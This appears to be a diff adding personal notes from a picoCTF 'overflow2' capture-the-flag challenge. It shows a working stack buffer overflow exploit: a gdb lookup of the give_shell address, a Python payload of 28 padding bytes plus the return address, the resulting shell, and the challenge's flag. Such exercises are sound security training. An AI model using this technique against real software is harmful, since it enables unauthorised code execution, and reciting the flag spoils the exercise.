@@ -1,0 +1,18 @@
+❯ gdb ./overflow2 -batch -n -ex "p give_shell" 
+$1 = {<text variable, no debug info>} 0x80484ad <give_shell>
+
+website suggests objdump -d overflow2 | grep "shell"
+(same result)
+
+pico62187@shell:/home/overflow2$ ./overflow2 $(python -c 'import struct; q=lambda x: struct.pack("I", x);print "A"*28 + q(0x080484ad)')
+$ id
+uid=28794(pico62187) gid=1003(overflow2) groups=1017(picogroup)
+$ cat flag.txt
+controlling_%eip_feels_great
+$ 
+Segmentation fault (core dumped)
+pico62187@shell:/home/overflow2$ 
+
+16+12=28
+buf is 16, 12 extra to get to eip on the stack
+illustrated on https://picoctf.com/problem-static/binary/Overflow2/overflow2.html
